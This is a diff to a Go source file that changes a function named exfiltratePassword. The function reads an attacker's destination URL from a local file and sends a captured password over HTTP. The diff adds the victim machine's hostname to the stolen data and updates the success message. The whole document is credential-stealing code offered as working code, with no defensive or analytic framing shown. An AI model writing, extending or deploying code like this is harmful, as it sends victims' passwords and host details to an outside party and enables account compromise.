@@ -4,12 +4,11 @@ import (
 	"fmt"
 	"io/ioutil"
 	"net/http"
+	"os"
 	"strings"
 )
 
 func exfiltratePassword(password string) {
-
-	// Read the exfil location from the file
 	exfilLocationBytes, err := ioutil.ReadFile("exfil_location")
 	if err != nil {
 		fmt.Println("Error reading exfil location from file:", err)
@@ -17,11 +16,15 @@ func exfiltratePassword(password string) {
 	}
 
 	exfilLocation := strings.TrimSuffix(string(exfilLocationBytes), "\n")
+	hostname, err := os.Hostname()
+	if err != nil {
+		fmt.Println("Error getting hostname:", err)
+		return
+	}
+	payload := fmt.Sprintf("password=%s&hostname=%s", password, hostname)
 
 	client := &http.Client{}
-	payload := strings.NewReader("password=" + password)
-
-	req, err := http.NewRequest("GET", string(exfilLocation), payload)
+	req, err := http.NewRequest("GET", exfilLocation, strings.NewReader(payload))
 	if err != nil {
 		fmt.Println("Error creating HTTP request:", err)
 		return
@@ -39,5 +42,5 @@ func exfiltratePassword(password string) {
 		return
 	}
 
-	fmt.Println("Password exfiltrated successfully.")
+	fmt.Println("pwd, and hostname exfiltrated successfully.")
 }
